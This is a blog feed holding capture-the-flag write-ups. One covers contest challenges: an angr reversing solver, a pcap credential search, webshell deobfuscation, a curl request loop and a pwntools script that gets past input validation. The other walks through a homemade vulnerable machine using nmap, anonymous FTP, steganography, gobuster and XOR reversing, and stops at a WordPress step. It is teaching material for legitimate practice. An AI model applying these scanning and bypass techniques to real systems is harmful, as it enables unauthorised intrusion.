&amp;&amp;</span><br><span class="line">                ((local_70._2_1_ ^ local_78._6_1_) == <span class="number">0x2b</span>)) &amp;&amp;</span><br><span class="line">               ((byte)(local_88._1_1_ + local_88._7_1_) == <span class="number">-0x79</span>)) &amp;&amp;</span><br><span class="line">              (((local_70._3_1_ ^ (byte)local_88) == <span class="number">0x2a</span> &amp;&amp;</span><br><span class="line">               ((byte)(local_78._5_1_ - local_88._1_1_) == <span class="string">&#x27;\v&#x27;</span>)))) &amp;&amp;</span><br><span class="line">             ((byte)(local_70._3_1_ + local_58._6_1_) == <span class="number">-0x32</span>)) &amp;&amp;</span><br><span class="line">            (((local_78._1_1_ ^ local_80._5_1_) == <span class="number">0x3b</span> &amp;&amp;</span><br><span class="line">             ((byte)(local_78._3_1_ - local_50._2_1_) == <span class="string">&#x27;\x12&#x27;</span>)))))))))) &amp;&amp;</span><br><span class="line">        ((((local_78._1_1_ == local_80._2_1_ &amp;&amp;</span><br><span class="line">           ((((byte)(local_80._6_1_ - local_50._2_1_) == <span class="string">&#x27;M&#x27;</span> &amp;&amp;</span><br><span class="line">             ((byte)(local_60._2_1_ * local_58._4_1_) == <span class="string">&#x27;N&#x27;</span>)) &amp;&amp; (local_58._2_1_ == (byte)local_68)</span><br><span class="line">            ))) &amp;&amp; (((local_60._7_1_ ^ local_58._3_1_) == <span class="number">0x38</span> &amp;&amp;</span><br><span class="line">                    ((<span class="type">char</span>)(local_68._6_1_ + local_70._1_1_) == <span class="number">-0x6c</span>)))) &amp;&amp;</span><br><span class="line">         ((byte)(local_60._1_1_ + local_58._4_1_) == <span class="number">-0x31</span>)))))) &amp;&amp;</span><br><span class="line">      ((((local_60._4_1_ == local_78._4_1_ &amp;&amp; ((<span class="type">char</span>)(local_80._4_1_ + local_70._1_1_) == <span class="string">&#x27;f&#x27;</span>)) &amp;&amp;</span><br><span class="line">        (((byte)(local_50._4_1_ + local_68._4_1_) == <span class="number">-0xf</span> &amp;&amp;</span><br><span class="line">         ((((byte)(local_60._1_1_ - local_78._5_1_) == <span class="string">&#x27;\x11&#x27;</span> &amp;&amp;</span><br><span class="line">           ((byte)(local_68._4_1_ - local_58._1_1_) == <span class="string">&#x27;D&#x27;</span>)) &amp;&amp;</span><br><span class="line">          ((byte)(local_80._1_1_ - local_68._3_1_) == <span class="string">&#x27;D&#x27;</span>)))))) &amp;&amp;</span><br><span class="line">       ((((local_58._5_1_ ^ local_58._3_1_) == <span class="number">1</span> &amp;&amp; ((local_68._2_1_ ^ local_50._1_1_) == <span class="number">0xd</span>)) &amp;&amp;</span><br><span class="line">        ((((byte)(local_80._3_1_ - local_70._4_1_) == <span class="number">-0x15</span> &amp;&amp;</span><br><span class="line">          (((((<span class="type">char</span>)(local_78._7_1_ + (<span class="type">char</span>)local_70) == <span class="number">-0x67</span> &amp;&amp;</span><br><span class="line">             ((byte)((<span class="type">char</span>)local_70 + local_80._5_1_) == <span class="number">-0x6b</span>)) &amp;&amp;</span><br><span class="line">            (((byte)(local_80._4_1_ - (byte)local_88) == <span class="number">-0x17</span> &amp;&amp;</span><br><span class="line">             (((((byte)(local_68._2_1_ + local_70._7_1_) == <span class="string">&#x27;`&#x27;</span> &amp;&amp;</span><br><span class="line">                ((byte)(local_88._5_1_ + local_58._5_1_) == <span class="number">-0x6a</span>)) &amp;&amp;</span><br><span class="line">               ((byte)(local_58._1_1_ * local_60._2_1_) == <span class="string">&#x27;`&#x27;</span>)) &amp;&amp;</span><br><span class="line">              (((byte)((<span class="type">char</span>)local_58 * local_78._5_1_) == <span class="string">&#x27;\x14&#x27;</span> &amp;&amp;</span><br><span class="line">               ((byte)(local_70._3_1_ - local_58._4_1_) == <span class="string">&#x27;\x03&#x27;</span>)))))))) &amp;&amp;</span><br><span class="line">           ((byte)(local_50._1_1_ + local_78._4_1_) == <span class="number">-0x6b</span>)))) &amp;&amp;</span><br><span class="line">         ((((byte)(local_80._2_1_ * local_58._5_1_) == <span class="number">-0x26</span> &amp;&amp;</span><br><span class="line">           ((byte)(local_88._1_1_ + local_60._1_1_) == <span class="number">-0x3c</span>)) &amp;&amp;</span><br><span class="line">          (((byte)(local_60._7_1_ - local_88._1_1_) == <span class="string">&#x27;\v&#x27;</span> &amp;&amp;</span><br><span class="line">           (((local_60._3_1_ == local_78._3_1_ &amp;&amp; ((byte)(local_68._7_1_ + local_60._7_1_) == <span class="number">-0x6d</span>)</span><br><span class="line">             ) &amp;&amp; ((byte)(local_80._4_1_ * local_50._2_1_) == <span class="string">&#x27;Q&#x27;</span>)))))))))))))) &amp;&amp;</span><br><span class="line">     (((((byte)((<span class="type">char</span>)local_80 * local_70._2_1_) == <span class="string">&#x27;A&#x27;</span> &amp;&amp;</span><br><span class="line">        ((byte)(local_60._6_1_ - local_70._7_1_) == <span class="string">&#x27;E&#x27;</span>)) &amp;&amp;</span><br><span class="line">       ((byte)(local_88._7_1_ + local_68._5_1_) == <span class="string">&#x27;h&#x27;</span>)) &amp;&amp;</span><br><span class="line">      (((((<span class="type">char</span>)(local_68._4_1_ + local_88._4_1_) == <span class="number">-0x44</span> &amp;&amp;</span><br><span class="line">         ((byte)(local_70._7_1_ + (byte)local_68) == <span class="number">-0x5e</span>)) &amp;&amp;</span><br><span class="line">        (((<span class="type">char</span>)(local_70._1_1_ + local_88._5_1_) == <span class="string">&#x27;e&#x27;</span> &amp;&amp;</span><br><span class="line">         ((((byte)(local_60._3_1_ * local_70._5_1_) == <span class="number">-0x13</span> &amp;&amp;</span><br><span class="line">           ((local_80._5_1_ ^ local_60._5_1_) == <span class="number">0x10</span>)) &amp;&amp;</span><br><span class="line">          ((<span class="type">char</span>)((<span class="type">char</span>)local_58 - local_80._4_1_) == <span class="string">&#x27;;&#x27;</span>)))))) &amp;&amp;</span><br><span class="line">       (((((<span class="type">char</span>)(local_78._7_1_ - (<span class="type">char</span>)local_80) == <span class="string">&#x27;\t&#x27;</span> &amp;&amp;</span><br><span class="line">          ((local_88._7_1_ ^ local_60._2_1_) == <span class="number">0x41</span>)) &amp;&amp;</span><br><span class="line">         ((<span class="type">char</span>)(local_88._5_1_ - local_60._3_1_) == <span class="number">-3</span>)) &amp;&amp;</span><br><span class="line">        (((((local_50._4_1_ ^ local_78._2_1_) == <span class="number">0x1a</span> &amp;&amp; ((local_88._1_1_ ^ local_88._3_1_) == <span class="number">0x2f</span>)</span><br><span class="line">           ) &amp;&amp; (((byte)(local_78._1_1_ - local_68._7_1_) == <span class="string">&#x27;+&#x27;</span> &amp;&amp;</span><br><span class="line">                 (((((byte)((<span class="type">char</span>)local_80 + local_78._4_1_) == <span class="number">-0x2d</span> &amp;&amp;</span><br><span class="line">                    ((byte)(local_80._3_1_ * local_58._5_1_) == <span class="number">-0x28</span>)) &amp;&amp;</span><br><span class="line">                   ((byte)(local_70._3_1_ + local_88._6_1_) == <span class="number">-0x2e</span>)) &amp;&amp;</span><br><span class="line">                  (((byte)(local_88._5_1_ + local_88._3_1_) == <span class="number">-0x55</span> &amp;&amp;</span><br><span class="line">                   ((byte)(local_68._3_1_ - local_60._7_1_) == <span class="number">-0x2e</span>)))))))) &amp;&amp;</span><br><span class="line">         (((byte)local_78 ^ local_68._1_1_) == <span class="number">0x10</span>)))))))))) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Freedom at last!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Lost in the darkness, you\&#x27;ll wander for eternity...&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></details><p>🙄 looks intimidating right? while competition i tried to to get the flag manually 😛, yeah it was silly<br>However, script that i used for solving the Shattered tablet worked for this challenge as well just change the target address </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">argv</span>):</span><br><span class="line"></span><br><span class="line">  path_to_binary = argv[<span class="number">1</span>]  <span class="comment"># :string</span></span><br><span class="line">  project = angr.Project(path_to_binary)</span><br><span class="line"></span><br><span class="line">  initial_state = project.factory.entry_state(</span><br><span class="line">    add_options = &#123; angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY,</span><br><span class="line">                    angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS&#125;</span><br><span class="line">  )</span><br><span class="line"></span><br><span class="line">  simulation = project.factory.simgr(initial_state)</span><br><span class="line"></span><br><span class="line">  print_good_address = <span class="number">0x401aba</span>  <span class="comment"># target address</span></span><br><span class="line">  simulation.explore(find=print_good_address)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> simulation.found:</span><br><span class="line"></span><br><span class="line">    solution_state = simulation.found[<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">print</span>(solution_state.posix.dumps(sys.stdin.fileno()).decode())</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not find the solution&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  main(sys.argv)</span><br></pre></td></tr></table></figure><h1 id="Forensic"><a href="#Forensic" class="headerlink" title="Forensic"></a>Forensic</h1><h2 id="Plaintext-Tleasure"><a href="#Plaintext-Tleasure" class="headerlink" title="Plaintext Tleasure"></a>Plaintext Tleasure</h2><blockquote><p>Threat intelligence has found that the aliens operate through a command and control server hosted on their infrastructure. Pandora managed to penetrate their defenses and have access to their internal network. Because their server uses HTTP, Pandora captured the network traffic to steal the server’s administrator credentials. Open the provided file using Wireshark, and locate the username and password of the admin.</p></blockquote><p>filtering the traffic to http and following through TCP stream at stream 4 we found FLAG </p><p><img src="/imgs/post3/forensic/plaintext_t.png" alt="plaintext_t"></p><h2 id="Alien-Cradle"><a href="#Alien-Cradle" class="headerlink" title="Alien Cradle"></a>Alien Cradle</h2><p>given powershell file that contain flag itself</p><p><img src="/imgs/post3/forensic/alien_cradle.png" alt="alien_cradle"></p><h2 id="Extraterrestrial-Persistence"><a href="#Extraterrestrial-Persistence" class="headerlink" title="Extraterrestrial Persistence"></a>Extraterrestrial Persistence</h2><p>given shell script that writting some base64 strings to somewhere in system that contain flag as Description</p><p><img src="/imgs/post3/forensic/extraterrestrial_persistence.png" alt="extraterrestrial_persistence"></p><h2 id="Rotten"><a href="#Rotten" class="headerlink" title="Rotten"></a>Rotten</h2><blockquote><p>The iMoS is responsible for collecting and analyzing targeting data across various galaxies. The data is collected through their webserver, which is accessible to authorized personnel only. However, the iMoS suspects that their webserver has been compromised, and they are unable to locate the source of the breach. They suspect that some kind of shell has been uploaded, but they are unable to find it. The iMoS have provided you with some network data to analyse, its up to you to save us.</p></blockquote><p>By reading Description it seems like we have to look for the shell that has uploaded as webserver has been compromised </p><p>as previous pcap challenge i started inspecting through tcp stream but nothing usefull after checking for a while, as shell upploaded on webserver it must be likely php file and we can export all file being transfered via Export Objects.</p><p>so started searching for any promising file name as there was lots of file it took time and finally i came across “map-update.php” file it has several file with same name but the size with 7,178 bytes was interesting.</p><p>it seems obfuscated, However after deobfuscate it didn’t change going through the code i looks like this gibberish value are being cocatinated one after another and finally printed</p><p><img src="/imgs/post3/forensic/rotten_1.png" alt="rotten_1"></p><p>running php file </p><p><img src="/imgs/post3/forensic/rotten_2.png" alt="rotten_2"></p><p>it found dificulty with <code>eval()</code> function so i changed it to <code>echo</code> as its used for printing the content<br>and after running the file it indeed worked and got flag in file.</p><p><img src="/imgs/post3/forensic/rotten_3.png" alt="rotten_3"></p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Persistence"><a href="#Persistence" class="headerlink" title="Persistence"></a>Persistence</h2><p>The aim of this task was to create a program that can automatically send a large number of requests (around one thousand) to an endpoint called &#x2F;flag. Eventually, the endpoint will respond with the correct flag. The following script can be utilized for this purpose.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ((i=<span class="number">0</span>;i&lt;<span class="number">1200</span>;i++))</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">        curl -s -X GET http://142.93.35.133:32034/flag</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><h2 id="Janken"><a href="#Janken" class="headerlink" title="Janken"></a>Janken</h2><p>this challenge has Rock-Paper-Scissor game on server and we have to win the game for 100(around i don’t remeber ) times in streak, However program had bug we made able to bypass the input validation by entering all word at once. </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;64.227.41.83&#x27;</span>,<span class="number">30145</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">info(<span class="string">&quot;Wait till you get the flag :) &quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        step = <span class="number">100</span>-i</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&#123;&#125; step closer to your flag&quot;</span>.<span class="built_in">format</span>(step))</span><br><span class="line">        <span class="comment">#recieve input interface</span></span><br><span class="line">        p.recv()</span><br><span class="line">        <span class="comment">#time.sleep(1)</span></span><br><span class="line">        p.sendline(<span class="string">&quot;rockpaperscissors&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;prize: &#x27;</span>)</span><br><span class="line">flag = p.recv()</span><br><span class="line">os.system(<span class="string">&quot;clear&quot;</span>)</span><br><span class="line">success(<span class="string">&quot;\n\n\tflag : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(flag))</span><br><span class="line"><span class="comment">#p.interactive()</span></span><br></pre></td></tr></table></figure><p><img src="/imgs/post3/misc/janken_misc.gif" alt="janken_misc"></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> pwn </tag>
            
            <tag> reversing </tag>
            
            <tag> misc </tag>
            
            <tag> forensic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Boot2Root CTF WriteUp : Pwn2Own</title>
      <link href="/2023/02/12/post2/pwn2own/"/>
      <url>/2023/02/12/post2/pwn2own/</url>
      
        <content type="html"><![CDATA[<p>Hola hackers!, what’s up?, I hope you all doin good .<br>As a CSE student we are to take vocationl training and submit a project(not major one) in that, we were told to make a project and present it that could be related to any suitable domain i started thinking about creating any network monitoring or malware analysis tool as i didn’t ever try to create big project i was excited to research from scratch and then trying to build own one </p><p>but i didn’t have enough time for that so i  thought about simple CTF based vulnerable machine where the aim was to introduce student to cybersecurity in a fun way by capturing the flag.<br>i tried to keep it begineer friendly(although it depends on player for new who don’t know anything about gonna bit tough) as this is college project majority of the student is not familiar to CTF </p><p>moreover i am going to share this blog link as a writeup with my project so for that reason i’ll keep this writeup as simple as possible so that one can understand what’s going on even if he&#x2F;she don’t know anything.<br>it might lengthy for someone who already know basic but bear with me i hope you’ll learn something new here :) </p><p>So in this blog i’ll walk you through this home made :P CTF machine however, i will write another blog where i’ll be writing how i created this machine and how you can create your own by yourself from the scratch.</p><p>As almost all CTF machine follows phases of hacking gradually i am going to design machine following those 5 phases i.e. Reconnaissance, Scanning, Gaining Access, Maintaing Acess ,Clearing Track.</p><p>Machine - <a href="https://github.com/Durge5h/Projects/tree/main/Pwn2Own">link</a> (i’ll upload this on THM later and update this link) </p><p>so let’s start ……</p><p><img src="/imgs/post2/logo.jpg" alt="logo here"></p><p>i am assuming you already done with machine setup and you have your machine up and running and assuming myself as i am solving this machine without knowing anything. </p><blockquote><p>It might there are grammer mistakes ‘cause i didn’t re-read my writeup as it was too lengthy so please bear … </p></blockquote><h1 id="Reconnaissance-Scanning"><a href="#Reconnaissance-Scanning" class="headerlink" title="Reconnaissance, Scanning"></a>Reconnaissance, Scanning</h1><p>First thing we require is IP of machine so that we can perform our reconnaissance and Scanning, as this machine is on ‘Bridged Adapter ‘ network type, IP will be at same adress space you can find our your with <strong>ifconfig</strong>, <strong>hostname -I</strong>  or using <strong>ip addr show ‘interface’</strong>  here my ip address is <strong>192.168.61.128</strong> .</p><p>I am using nmap(Nmap or Netwok mapper is a network scanning tool ,an open source Linux command-line tool—used for <strong>network scanning, host discovery, and security auditing</strong>. ) here for scanning machine </p><p><strong>command - <code>nmap -sV 192.168.61.0-255</code></strong> </p><p>-sV switch for scan open ports to determine service&#x2F;version info and 255 added in last octed to scan all host, as target machine is part of same adress space it is going to scan by nmap </p><p><img src="/imgs/post2/nmap-scan1.png" alt="nmap-scan1"></p><p>as you can see image above second ip addr is target machine’s ip with nmap scan report<br>look at the all header above now we know all PORT their STATE , SERVICE and VERSION<br>we can serach for vulnerability using port service version if used version is vulnerable we can exploit the service and gain access to the machine .</p><p>power of nmap -  nmap is smart enough to find out some low hanging fruit vulnerability<br>we can use -sC switch to see , is there any script available to exploit  those vulnerability<br>or verbose any service weakness.</p><p><img src="/imgs/post2/nmap-scan.png" alt="nnmap-scan"></p><p>there we go , see outlined result above we are allowed to login as anonymous in ftp server which is to say we don’t need any credentials(Anonymous authentication in FTP is avulnerability that allows users to log in with a user name of FTP or anonymously)<br>so lets login to ftp as anonymous user </p><p><img src="/imgs/post2/ftp-login.png" alt="ftp-login"></p><p>see what we got here ? , some jpg images and and README.txt file<br>README.txt is for you :)<br>lets focus on those images sequentially </p><p><img src="/imgs/post2/ftp-data.png" alt="ftp-data"></p><p>firstly download the images to your host machine using ‘get’ command</p><p><img src="/imgs/post2/get-image.png" alt="get-image"></p><p>01_insideme.jpeg -&gt; checking image file to see is it really what its looking like </p><p><img src="/imgs/post2/file-check1.png" alt="file-check1"></p><p>hmm, yeah now i am sure it is jpeg file , lets open it </p><p><img src="/imgs/post2/eog-image1.png" alt="eog-image1"></p><p>got QR code here, do we have to make payment via this code ? :D<br>then what it could be, one way to know is scan this code we can use simple QR-reader application on our phone or if you are too lazzy to do that use linux utility ‘zbarimg’ .</p><p><img src="/imgs/post2/qr-decode.png" alt="qr-decode"></p><p>we got part1 credential , but whats inside that curly braces looks like some cipher text<br>yeah obviously who don’t knows base64,it is base64 encoded string lets decode with linux utility base64 </p><p><img src="/imgs/post2/part1-decode.png" alt="decode-part1"></p><p>got <strong>user : pwner</strong> that could be username of any server maybe local user in target machine? if so it will require while ssh-ing .<br>hmm, now let’s look 02_hidden.jpg file same as before check the file info with file command</p><p><img src="/imgs/post2/file-check2.png" alt="file-check2"></p><p>can you see comment section, got some string over there it seems like tried to hide information in this image file lets print EXIF data(<em>EXIF data</em> contains information on image and audio files. EXIF stands for Exchangeable Image File Format. we can consider it as a meta data(data of data)) using tool exiftool(ExifTool is a free and open-source software program for reading, writing, and manipulating image, audio, video, and PDF metadata) </p><p><img src="/imgs/post2/exifinfo.png" alt="exifinfo.png"></p><p>has different headers here but more interesting one is ‘Comment’ header that we found earlier in file command it says ‘do you know looping making things handy’ , is it some kind of hint to solve challenge, okay lets bear in mind for now ,<br>hmm, so we have given image here what the most possbile way to hide something in another file or image here as far as i know stegno , isn’t it? </p><p>from the size(300kb) of image file it is possible to hide some data here remember last challenge however, that was QR code but it is possible ,so keeping that in mind is used some stegno tool here </p><p>1 - binwalk(Binwalk is <strong>a tool for searching a given binary image for embedded files and executable code</strong>)</p><p><img src="/imgs/post2/binwalk-res.png" alt="binwalk-res"></p><p>nothing special here lets try another one,</p><p>2 - Steghide(<em>Steghide</em> is a steganography program that is able to hide data in various kinds of image- and audio-files.)</p><p><img src="/imgs/post2/steghide-info.png" alt="steghid-info"></p><p>we asked for password just hit enter as we don’t know and it worked we didn’t need t, a zip file got extracted here<br>lets extract this zip file </p><p><img src="/imgs/post2/extracted.png" alt="extracted"></p><p>oh my … lots of directories precisely 1000 folders here which one contain flag here<br>maybe file40? , file100? or file249? okay now we are to fine second part of our credentials<br>checking each directory manually one by one gonna take tremendious time isn’t it?</p><p>what we can do is use a utility call ‘tree’ for navigating to each dirs and printing whats inside there whereby we could know which one contain our credential</p><p><img src="/imgs/post2/tree-cmd.png" alt="tree-cmd"></p><p>as you can see by using <code>tree *</code> command we got to know <strong>file840</strong> contain list of file<br>so lets change directory to file840 and list the file </p><p><img src="/imgs/post2/flag-file.png" alt="flag-file"></p><p>uhhhh , again but now i can’t use ‘tree’ command ‘cause that work for directory not data or text file , remember that hint before we got from exif-tool - <strong>do you know looping making things handy</strong> , hmm talking about loop here …. oh okay gotcha! we have to automate our work using loop statement here , you can use any suitable lang here</p><p>i am using shell here as it will work interactive here , but i don’t think you are require to write any script here, more easy way to grab the contain is using <strong>grep</strong> command we just have to search for paritcular string in these files , now what should be that string </p><p>hmm .. first challenge had part1{} syntax so it should be part2{} here lets try.. </p><p><strong>command -  <code>grep part2 *</code></strong></p><p><img src="/imgs/post2/part2-flag.png" alt="part2-flag"></p><p>hmm, gotcha ..<br>lets decode it , tried base64 that throw invalid input with gebberish value if you know familiar with base encoding technique it seems like base32 lets try that one.</p><p><img src="/imgs/post2/part2-cred.png" alt="part2-cred"></p><p>okay so come up with string here , it seems to incomplete<br>we are to capture 3 parts of credentials we already done two<br>so far captured credentials are  -<br>**user : pwner , there y0u go - “__m__o__n” ** </p><p>so <strong>pwner</strong> is username and <strong>“__m__o__n”</strong> seems to be password of that user but problem is its  incomplete , okay lets move ahead .</p><p>if you payed attention while scanning the IP, we also had <strong>port 80 http service</strong> running with <strong>apache</strong> server over there </p><p><img src="/imgs/post2/nmap-scan2.png" alt="nmap-scan2"></p><p>so lets browse the target ip in browser and see what we got there </p><p><img src="/imgs/post2/homepage.gif" alt="hompage"></p><p>okay so as expected website running here , lets walk around see what got here </p><p>i started go-buster(Gobuster is a tool used to brute-force URIs including directories and files as well as DNS subdomains) without thinking anything and searching for any usefull info while go buster is running</p><blockquote><p>Note : using dirlist&#x2F;directory-list-2.3-medium.txt wordlist that comes by default dirbuster i guess , download from <a href="https://github.com/drtychai/wordlists/blob/master/dirbuster/directory-list-2.3-medium.txt">here</a> </p></blockquote><p><img src="/imgs/post2/gobuster-scan.png" alt="gobuster-scan"></p><p>during that i got base64 encoded string in site’s source code </p><p><img src="/imgs/post2/web-hint.png" alt="web-hint"></p><p>decoding this string got msg says <strong>Hint : do you know how to stop crawler from access sensitive content in your website ?</strong><br>aftere some google fu , got to know that we can use <a href="https://en.wikipedia.org/wiki/Robots.txt">robots.txt</a> file for that purpose one more thing usually stored on home directory of website whis is to say <strong>host&#x2F;robots.txt</strong> </p><p>lets browse robots.txt file and what we got there </p><p><img src="/imgs/post2/robots-txt.png" alt="robots-txt"></p><p>Interesting ! , &#x2F;flag.txt is Disallowed from crawling the user agent where &#x2F;secret directory is allowed … both look tempting we are to capture the flag.txt eventually is it that flag we have been told to capture lets see ..</p><p><img src="/imgs/post2/fake-flag.png" alt="fake-flag"></p><p><img src="/imgs/post2/sakshi-okay.gif" alt="sakshi-okay"></p><p>so it was fake flag, hmm never mind lets move ahead we still have &#x2F;secret dir to check</p><p><img src="/imgs/post2/secret-dir.png" alt="secret-dir"></p><p>ahhaaa! , some juicy stuff lets read README.txt file first</p><p><img src="/imgs/post2/rev-readme.png" alt="rev-readme"></p><p>by reading this README.txt file we got to know that we should have basic understanding of RE and tools used , okayyy i was born ready :P  now lets look at tar file </p><p><img src="/imgs/post2/wget-something.png" alt="wget-something"></p><p><img src="/imgs/post2/extract-something.png" alt="extract-something"></p><p>after extracting the file we got binary call <strong>playme</strong> lets run the binary </p><p><img src="/imgs/post2/playme-run.png" alt="playme-run"></p><p>here we are to guess the password lets try to enter some random string </p><p><img src="/imgs/post2/playme-passguess.png" alt="playme-passgues"></p><p>hmm… okay so approach to solve RE challenge is to firstly look for low hanging fruit like strings on binary there is possibility to get some crucial info<br>so lets check for stirngs usign <strong>strings</strong> utility in linux</p><p><img src="/imgs/post2/playme-strings.png" alt="playme-stinrgs"></p><p>printing out strings in binary we come up with some interesting strings as you can see  above image over there , printed strings when we saw while guessing the pasword as well as some extra interesing aftere <strong>Guess the password :</strong> string there is string look like password , tried to use that string as a password </p><p><img src="/imgs/post2/rev-pass.png" alt="rev-pass"></p><p>okay so it was password for that binary , now we been saying to find the flag<br>i thought i solved this challenge but as name implies it is based on Reverse engineering not gonna be that easy .. now what next? remeber we been told have prior knowledge of debugger(A debugger or debugging tool is a computer program used to test and debug other programs.) and decompiler(A decompiler is a computer program that translates an executable file to a high-level source file which can be recompiled successfully) </p><p>i fired ghidra(Ghidra is a free and open source reverse engineering tool developed by the National Security Agency of the United States) ‘cause i &lt;3 ghidra , after pulling binary to ghidra we have to look for function as a compiled code contain lot of functions i.e. system function and user defined function , after looking at <strong>Symbol Tree</strong> section on ghidra we found some function listed these are being used in binary </p><p><img src="/imgs/post2/functions.png" alt="function"></p><p>As we know programm start with <strong>main</strong> porgram i started reading decompiled main function </p><p><img src="/imgs/post2/ghidra-mainn.png" alt="ghidra-main"></p><p>it looks bit messy here in starting as ghidra generate psuedo code but after paying attnetion and changing varibles name to undrestandable name it became more convenient.</p><p><img src="/imgs/post2/ghidra-main2.png" alt="ghidra-main2"></p><p>lets understand now how exactly program is running ..<br>initially some local variable are initiated i.e. - user_input, input_length and result then user is asked to Guess the password(line 14) as saw while running the binary and then user input are stored on user_input vairable and then in next line hardcoded string is compared with user’s input and return  value is stored in <strong>result</strong> var, consequently that resultant var is compared whether it is equal to <strong>0</strong> or not , if it is then then congratulate strings are printed and program enters into for loop(19) or else , else message in else part is printed .</p><p>okay, so everything is expected here but whats in for loop? lets see<br>hmm… a loop is going on starting from 0(i&#x3D;0) and looping until given condition is met i.e. var ‘i’ value less than user’s input_length and meanwhile user’s each input char(user_input[i]) is xored(look at the ‘^’ sign over there depicted in screenshot above) with 0x42(66) number(line 21) and getting stored in user_input var itself </p><p>so in case if you do not know how XOR operation work simply putting  XOR compares two input bits and generates one output bit. The logic is simple. If the bits are the same, the result is 0. If the bits are different, the result is 1.</p><p><img src="/imgs/post2/xor-op.png" alt="xor-op"></p><p>but we don’t have two bit as 0’s and 1’s we are dealing with char and number here so how this operation take place lemme elaborate just keep your eye in this image below </p><p><img src="/imgs/post2/xor-op2.png" alt="xor-op2"></p><p>lets suppose our Original Message is <strong>a,b,c,d</strong> shown image above and as these chars are part of ASCII  character set if we encode in decimal we will get <strong>97,98,99,100</strong> sequentially that is being used as Byte and Encryption Key is <strong>69</strong> XOR operation of each char’s decimal form to Encryption key i.e. 69 we get another decimal number that is then decoded as char .</p><p>okay so long story short we are to get those decoded value that is being stored on user_input var in each loop and getting over-write with next one .</p><p>how we can achieve that? , as we already know user_input i.e. original message and encryption key i.e. 66 we are to just run XOR operation or else had to debug the binary and see each character in single loop at run time</p><p>wrote simple python script </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">def xor(s, v):</span><br><span class="line">return &quot;&quot;.join(chr(ord(c) ^ v) for c in s)</span><br><span class="line"></span><br><span class="line">xored_string = xor(&#x27;durge5h3#*9sd&#x27;, 0x42)</span><br><span class="line">print(xored_string)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/imgs/post2/py-xor.png" alt="py-xor"></p><p>Bravo, finally we got it .</p><blockquote><p>XOR result &#x3D; <code>&amp;70%&#39;w*qah&#123;1&amp;</code>  </p></blockquote><p>whats the use of this gebberish string , is this password? if so where to use?<br>don’t know just bear in mind for now maybe gonna use later</p><p>woops, we forgot the GO-buster completely lets see what he got</p><p><img src="/imgs/post2/gobuster-scan2.png" alt="gobuster-scan2.png"></p><p>hmm … got another dircotry <strong>&#x2F;wordpress</strong> it seems wordpress CMS running here let browse to <strong>192.168.61.239&#x2F;wordpress</strong> location </p><p><img src="/imgs/post2/wordpress-look.gif" 